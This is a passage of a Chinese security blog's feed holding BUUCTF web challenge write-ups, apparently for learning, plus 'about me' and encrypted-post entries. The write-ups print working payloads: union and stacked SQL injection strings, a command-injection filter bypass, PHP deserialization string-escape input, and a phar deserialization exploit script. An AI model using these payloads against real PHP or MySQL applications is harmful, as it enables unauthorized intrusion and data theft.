class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">def Exec(self):</span><br><span class="line">        result &#x3D; &#123;&#125;</span><br><span class="line">        result[&#39;code&#39;] &#x3D; 500</span><br><span class="line">        if (self.checkSign()):</span><br><span class="line">            if &quot;scan&quot; in self.action:</span><br><span class="line">                tmpfile &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;w&#39;)</span><br><span class="line">                resp &#x3D; scan(self.param)</span><br><span class="line">                if (resp &#x3D;&#x3D; &quot;Connection Timeout&quot;):</span><br><span class="line">                    result[&#39;data&#39;] &#x3D; resp</span><br><span class="line">                else:</span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[&#39;code&#39;] &#x3D; 200</span><br><span class="line">            if &quot;read&quot; in self.action:</span><br><span class="line">                f &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;r&#39;)</span><br><span class="line">                result[&#39;code&#39;] &#x3D; 200</span><br><span class="line">                result[&#39;data&#39;] &#x3D; f.read()</span><br><span class="line">            if result[&#39;code&#39;] &#x3D;&#x3D; 500:</span><br><span class="line">                result[&#39;data&#39;] &#x3D; &quot;Action Error&quot;</span><br><span class="line">        else:</span><br><span class="line">            result[&#39;code&#39;] &#x3D; 500</span><br><span class="line">            result[&#39;msg&#39;] &#x3D; &quot;Sign Error&quot;</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br></pre></td></tr></table></figure><br>分析知道这段代码逻辑是：用客户端ip的md5值创建一个sandbox，如果action参数中有scan就将param参数的内容写在result.txt文件中；如果action参数中有read就读取写入的文件。</p><hr><p>/<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)def index():</span><br><span class="line">    return open(&quot;code.txt&quot;,&quot;r&quot;).read()</span><br></pre></td></tr></table></figure><br>这个页面就是获取源代码的页面。</p><hr><p><strong>解题：</strong><br>这道题就是在Da1ta页面中传入如下参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">action&#x3D;readscan</span><br><span class="line">param&#x3D;flag.txt</span><br><span class="line">sign&#x3D;md5(secert_key+read+sign)</span><br></pre></td></tr></table></figure><br>在geneSign函数中可以获得到md5(secert_key+param+sign)的值，我们可以在这个页面传入param=flag.txtread 即可完成字符串的拼接。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/15.png" class title="Da4er"><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/16.png" class title="Da4er"></p><hr><h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h3><p><strong>知识点：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录。</span><br></pre></td></tr></table></figure><br>WEB-INF下面的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。  </span><br><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line"></span><br><span class="line">&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line"></span><br><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。</span><br><span class="line"></span><br><span class="line">&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</span><br></pre></td></tr></table></figure><br><strong>解题：</strong><br>打开help页面，发现是一个download页面，但是没有下载，需要使用post传参。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/17.png" class title="Da4er"><br>然后访问WEB-INF/web.xml，找到flag所属的类<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/18.png" class title="Da4er"><br>所以直接访问这个class类的目录：<br>找到一段base64解码得到flag<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/19.png" class title="Da4er"><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/20.png" class title="Da4er"></p><hr><h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h3><p><strong>知识点：</strong><br>1.<strong>数组绕过正则及相关</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">md5(Array()) &#x3D; null </span><br><span class="line">sha1(Array()) &#x3D; null </span><br><span class="line">ereg(pattern,Array()) &#x3D; null </span><br><span class="line">preg_match(pattern,Array()) &#x3D; false </span><br><span class="line">strcmp(Array(), &quot;abc&quot;) &#x3D; null </span><br><span class="line">strpos(Array(),&quot;abc&quot;) &#x3D; null </span><br><span class="line">strlen(Array()) &#x3D; null</span><br></pre></td></tr></table></figure><br>2.<strong>php反序列化长度变化尾部字符串逃逸</strong><br>假如有如下序列化：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;13587819970&quot;;s:5:&quot;email&quot;;s:32:&quot;44444545487956214698745621365478&quot;;s:8:&quot;nickname&quot;;s:10:&quot;12345hacke&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload&#x2F;f47454d1d3644127f42070181a8b9afc&quot;;&#125;</span><br></pre></td></tr></table></figure><br>经反序列化之后：<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/21.png" class title="Da4er"><br>发现s:39之后的都没有被反序列化，但是正常输出了。</p><hr><p><strong>解题：</strong><br>扫描目录发现<a href="http://www.zip，打开审计代码，找到一处file_get_contents函数漏洞利用">www.zip，打开审计代码，找到一处file_get_contents函数漏洞利用</a><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/22.png" class title="Da4er"><br>这个漏洞出现在用户更新数据页面，先经过反序列化，在进行赋值。跟进函数发现对profile有三处过滤：<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/23.png" class title="Da4er"><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/24.png" class title="Da4er"><br>首先是正则匹配，可以使用数组绕过；在filter函数里有两处过滤，有一处是将where转换成hacker，5个字符换成了6个字符。<br>漏洞点是出现在上传图片的参数，这个时候就是要将s:5:”photo”;s:10:”config.php”;}塞到photo参数里，让它读取config.php下的flag。可以使用反序列化尾部字符串逃逸。</p><p>在nickname上操作，payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nickname[]</span><br><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure><br>在nickname上输入34个where，每个where都会换成hacker，多增加一个字符，最后会把s:5:”photo”;s:10:”config.php”;}挤到photo参数上。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/25.png" class title="Da4er"><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/26.png" class title="Da4er"></p><hr><h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>拿到题目，发现是命令执行漏洞。直接ls查看到有两个文件：flag.php,index.php。<br>通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$IFS&#96;ls&#96;</span><br></pre></td></tr></table></figure><br>查看到index.php源码<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/27.png" class title="Da4er"><br>看到过滤了一些字符，最后的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;lag;b&#x3D;f;cat$IFS$b$a.php;</span><br></pre></td></tr></table></figure><br>查看源代码找到flag。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/29.png" class title="Da4er"></p><hr><h3 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h3><p>很简单的上传，直接上传phtml的<script>小马即可，没有给上传的文件所在目录，通过猜测是upload。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/30.png" class="" title="Da4er"></p><hr><h3 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h3><p><strong>知识点：绕过information.schema与无列名注入</strong><br>参考博客：<br><a href="https://www.anquanke.com/post/id/193512">https://www.anquanke.com/post/id/193512</a><br>绕过information.schema可以使用sys.schema_auto_increment_columns<br>无列注入可以自己构造列名。<br><strong>解题：</strong><br>注入发生在编辑广告的界面上，在输入广告名时会在查看报错，说明是存在二次注入的。<br>但是报错函数被过滤，可以使用union查询。<br>payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 判断有多少字段 -1&#39;&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;22,&#39;1 </span><br><span class="line"># union 查询 -1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br><span class="line"></span><br><span class="line"># user()发现是 root@localhost 权限 -1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,user(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22 </span><br><span class="line"># 查看 mysql 的版本号 -1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22 </span><br><span class="line"># 在 sys 数据库中查询表名 </span><br><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;sys.schema_auto_increment_columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;schema()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br><span class="line"></span><br><span class="line"># 通过无列名注入 users 表中的数据</span><br><span class="line"># 第二个字段</span><br><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(a)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2&#x2F;**&#x2F;as&#x2F;**&#x2F;a,3&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br><span class="line"># 第三个字段</span><br><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/31.png" class="" title="Da4er"></p><hr><h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/32.png" class="" title="Da4er"><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/33.png" class="" title="Da4er"><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/34.png" class="" title="Da4er"><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/35.png" class="" title="Da4er"><p>payload如下，很简单的php反序列化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h3><p>堆叠注入，使用handler关键字<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/36.png" class="" title="Da4er"><br>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;handler&#96;FlagHere&#96;open+as+da4er;handler+da4er+read+first;Handler+da4er+close;&#39;</span><br></pre></td></tr></table></figure><hr><h3 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h3><p>运用数学函数和^符号可以构造任意字符<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/37.png" class="" title="Da4er"><br>参考博客：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;20175211lyz&#x2F;p&#x2F;11588219.html</span><br><span class="line"></span><br><span class="line">有很多种解法</span><br></pre></td></tr></table></figure><hr><h3 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h3><p><strong>知识点：任意文件下载，phar反序列化扩展攻击</strong><br>明天好好总结一下，在wp中不讲那么详细了。<br>使用phar的三个条件说一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.phar文件要能够上传到服务器端。</span><br><span class="line">2.如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数要有可用的魔术方法作为&quot;跳板&quot;。</span><br><span class="line">3.文件操作函数的参数可控，且::、&#x2F;、phar等特殊字符没有被过滤。</span><br></pre></td></tr></table></figure><br>形成的phar文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User&#123;</span><br><span class="line">    public $db;</span><br><span class="line">&#125;</span><br><span class="line">class File&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;filename &#x3D; &#39;&#x2F;flag.txt&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class FileList&#123;</span><br><span class="line">    private $files;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;files &#x3D; array(new File());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$Da4er &#x3D; new User();</span><br><span class="line">$Da4er-&gt;db &#x3D; (new FileList());</span><br><span class="line">@unlink(&quot;da4er.phar&quot;);</span><br><span class="line">$phar &#x3D; new Phar(&quot;da4er.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);</span><br><span class="line">$phar-&gt;setMetadata($Da4er);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/38.png" class="" title="Da4er"></p></script></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;/p&gt;
&lt;h3 id=&quot;RoarCTF-2019-Easy-Calc&quot;&gt;&lt;a href=&quot;#RoarCTF-2019-Easy-Calc&quot; class=&quot;headerlink&quot; title=&quot;[RoarCTF 2019]Easy Calc&quot;&gt;&lt;/a&gt;[RoarCTF 2019]Easy Calc&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;知识点：PHP字符串的解析漏洞。&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&amp;gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替，如下图：&lt;br&gt;&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>关于我</title>
    <link href="https://da4er.top/%E5%85%B3%E4%BA%8E%E6%88%91.html"/>
    <id>https://da4er.top/%E5%85%B3%E4%BA%8E%E6%88%91.html</id>
    <published>2020-03-02T08:29:56.000Z</published>
    <updated>2020-03-05T02:58:52.647Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><img src="/%E5%85%B3%E4%BA%8E%E6%88%91/1.jpg" class><br>努力赶上大佬的安全小白；<br>励志做一个安全研究员的大学生；<br>三流CTFer。</p><hr><p>2020年计划：<br>用PHP开发一个MVC架构的项目；<br>努力提高自己的代码审计能力;<br>用Python写一个Scrapy的分布式爬虫；<br>用Python写一个Blog;<br>努力刷题，让自己在CTF小有成就。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;img src=&quot;/%E5%85%B3%E4%BA%8E%E6%88%91/1.jpg&quot; class&gt;&lt;br&gt;努力赶上大佬的安全小白；&lt;br&gt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>2020_2月总结</title>
    <link href="https://da4er.top/2020-2%E6%9C%88%E6%80%BB%E7%BB%93.html"/>
    <id>https://da4er.top/2020-2%E6%9C%88%E6%80%BB%E7%BB%93.html</id>
    <published>2020-03-02T03:10:39.000Z</published>
    <updated>2020-03-02T03:41:18.847Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="cc3ded855722b4bf5382b1e7e0985f9e144be3f3e8ffe7587e9ab19033183af3">6cc52367ac4ba55a89d8bcdea23e0ced3ab7a32282ef7962620f1625d9959dc1b96013a9c79e5584042ba454b9d2950228f18ca4ecddbd7e05a7ce26c4f7d34e3a84f814c24b1812fb180e5e137653233172e35c773fbfb8393b6d8e1b7f250728ec306468404de2c5a475db103c7729d0cb063ee43cac5b64922c91f21436c28cb2a3c93134bb219dd06cd1d667a921f8d0ac1f1a0e71e129d1871e29db27c02a7a7e0b00a18e4050a9ecadd382def09b988d840bb3c49b07bd0328b848709ed1e5f2dde3cae4d29e289a6e53cb2cd8a16cfcc27eb9a0edc4afa5faa575879610edb174671a51ad44df87219189f78bd0c1f5bd62417e13826ffd3aa63bb0ec61b9a4cfa06cdc573b512bd64d983d908aeef243aefd3665e63f952552430f8e3ddf382c15f55192607263b2956774348c2f7f60dbdfff8b089a574c109ccd553ca32d4835fd4043bd0c8148d3585777c9c3bb9bc441a94ae3976b7b870e28cd34ab249d8dc3ad818622c4765e14029d7c093ba1c166d06928d31b67afcec3e6c99e3c9d88815d08c557613651878112b97fe05b813832c94f78e737f4e9746206ade9e98c33ba5ac636a1c5611dacc6be585b7a7143d4999a9009fef3e9b5e56b2fdf014fbe570ad21434474e6eb13d64d20bf8f2a942a6598de7793de252a268635638764b3df84e4d3cfbd97adae190b3338a951200e19fea688de68c7c39d5d4677069b40e8d3f6676c44293faeb20ddfd5c671ad535a01417343cd15efb6816c571c8b9e83d9258e302616b498b93c8888f27ac4a65ca53481cedeba2fb1b216502475bfc1a2e0a5e87950cd4910dc8546cec32feb782bd13c0fa68e9c29c2aa3bb19bee109635b49f206f5ca3c4a02131ece94a421b5426f91ea01a3e5b14baca90f25d6d824c8c55c76e7d82edcb8a113a857d870c0235e81add1d85993b106f9d138319b8cab2a334652c367c5c5191283c34de0daaa76c1b0238c18e9e9e1a8d0e698506892ec4881fa3eac9436cdbd86a7f4187da999b89a2701a8138aada960d03b53e96ae030e2030797b4e9938b0826624848d89b501c880c3db82228cf4dc376891de9dc2b31b7ef85caa8acd782a704eb4c8cb28028ab0c05d4d42196bb58f72ca1c365e03f41ebe18dcf2a959d7fd6011893e0bcf084881e4ee0571c678d3db2bd24b8cf1b704194bf7bde072c8f83bf73671a525cc16534a4126d3dce472d9d8e664ea3055579349534cd0b85e2476220d05e554eb3b4cbb58b405103cac8f6a1fb62f095e63b1ed0661b4eb9bc700bf88c009a86510b4610f2a799f6e0748b112fae18db4afbe5b75ce163492e604b725db2baaec2d06864751d1cef111ec048ab878585318ffaead9839d482a804869ffdf65d1e87ffd156cc15612d41616badaefa4645bc072bc375a9600767fe5da453a3fd5ff45ea9ac862db3cb5b316627df88edaaea44c590011ffe708c9b1ae6f2e07fe62c4aced5d5be59191945b36fb549ba8afb3cc6f4cc2e5f1874bdac8d55e6366f1b003069321e56cf7fed9e9ade6b7ba69d2882dc8799e661798fa6a7e292eeec7b18984de389f58b74487d873c9f31200b4ba7c340b98e7148a0a48020b68f529abc6c6b71850609bd00e393907374a911dc207dd207974aa74b2c73da1008e44e2161af80fcc1af1ade1b378132804d42be5e113415b02d75078ab70f0fec444f25af34e9185ef7ccb491de1aac1f4915fda41442c86b4c2967aaefc979d1031c14613c4031e5074573add17c62ad720aeb67e3f82e199d0935281a60cfa8ccbe302b6d721ef139e72f3199614e9195b87d57e80aac2531e0816bea8f50fb74e8728751fdc32801ad61543929450703f6032db221e7a6e85dbbe421f16b99d8a2e2aa7bf641aaa84bf7caeb5c257fe548399e41b09c0c600522f7fbf99530517b65bbb738e5c75cb66950f24701883e8e10150be55e42037cbd39ddfb188c37d216c6f0feff2712ecec57ac1f47006a54e9d95ebbb391e3e645ba26112420b2fcf198c10b6adcf13741b902ea7e84138604aa1b8fb61db43537479eb71b6373d411f</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="随笔" scheme="https://da4er.top/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>Java学习笔记</title>
    <link href="https://da4er.top/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html"/>
    <id>https://da4er.top/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</id>
    <published>2020-02-27T10:40:25.000Z</published>
    <updated>2020-03-19T02:34:37.430Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="2f07b89e873b2583cd6c848df4f751690cb0dd8c19a6ee9143276b8b10e8e3a6"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://da4er.top/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>SQL注入Trick(持续更新.....)</title>
    <link href="https://da4er.top/SQL%E6%B3%A8%E5%85%A5Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html"/>
    <id>https://da4er.top/SQL%E6%B3%A8%E5%85%A5Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html</id>
    <published>2020-02-26T08:16:54.000Z</published>
    <updated>2020-03-08T08:27:35.724Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="5ab4dfc37b2b56a83847e9ff5eacf45836d2a8763a325ad3932bf3f4e4dbbcd0"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/tags/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入绕过笔记(一)</title>
